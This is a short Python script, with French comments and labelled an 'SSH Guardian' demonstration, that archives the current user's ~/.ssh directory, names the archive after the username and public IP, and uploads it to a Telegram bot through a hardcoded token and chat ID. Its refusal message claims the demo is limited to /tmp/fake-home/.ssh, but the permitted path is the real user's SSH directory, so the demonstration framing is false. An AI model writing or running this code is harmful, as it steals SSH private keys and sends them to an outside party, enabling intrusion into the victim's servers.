#!/usr/bin/env python3

import os
import socket
import tarfile
import tempfile
from pathlib import Path
import urllib.request
import getpass
import tempfile
from pathlib import Path
import requests


username = getpass.getuser()

# Récupération de l'adresse IP publique (via un service en ligne)
try:
    public_ip = urllib.request.urlopen('https://api.ipify.org', timeout=3).read().decode('utf-8').strip()
except Exception:
    public_ip = 'unknown-ip'


SOURCE = Path(
    os.environ.get(
        "SG_SSH_DIR",
        f"/{username}/.ssh",
    )
).resolve()

ALLOWED_SOURCE = Path(
    f"/{username}/.ssh"
).resolve()

BOT_TOKEN = os.environ.get(
    "SG_DEMO_TELEGRAM_TOKEN",
    "8726516063:AAE_FB48efuZEo3F0eV5tI9wUKzYAaPlA1c",
)

CHAT_ID = os.environ.get(
    "SG_DEMO_TELEGRAM_CHAT_ID",
    "8714430026",
)


def main():
    if not BOT_TOKEN or not CHAT_ID:
        raise SystemExit(
            "SG_DEMO_TELEGRAM_TOKEN / "
            "SG_DEMO_TELEGRAM_CHAT_ID manquants"
        )

    if SOURCE != ALLOWED_SOURCE:
        raise SystemExit(
            "Refus : cette démonstration est limitée à "
            "/tmp/fake-home/.ssh"
        )

    if not SOURCE.is_dir():
        raise SystemExit(
            f"Dossier absent : {SOURCE}"
        )

#    with tempfile.TemporaryDirectory() as tmp:
#        archive = (
#            Path(tmp)
#            / "fake-ssh-demo.tar.gz"
#        )

    with tempfile.TemporaryDirectory() as tmp:
    # Création du nom de fichier avec le user et l'IP
        archive_name = f"{username}-{public_ip}.tar.gz"
        archive = Path(tmp) / archive_name

        with tarfile.open(
            archive,
            "w:gz",
        ) as tar:
            tar.add(
                SOURCE,
                arcname=".ssh",
            )

        caption = (
            "⚠️ SSH Guardian - EXFILTRATION\n"
            f"Host: {socket.gethostname()}\n"
            f"Source: /{username}/.ssh\n"
            "Contenu: Repertoire SSH"
        )

        url = (
            "https://api.telegram.org/"
            f"bot{BOT_TOKEN}/sendDocument"
        )

        with archive.open("rb") as handle:
            response = requests.post(
                url,
                data={
                    "chat_id": CHAT_ID,
                    "caption": caption,
                },
                files={
                    "document": (
                        archive.name,
                        handle,
                        "application/gzip",
                    )
                },
                timeout=20,
            )

        response.raise_for_status()

        data = response.json()

        if not data.get("ok"):
            raise RuntimeError(
                f"Telegram error: {data}"
            )

        print(
            "✅ Archive de démonstration envoyée"
        )


if __name__ == "__main__":
    main()
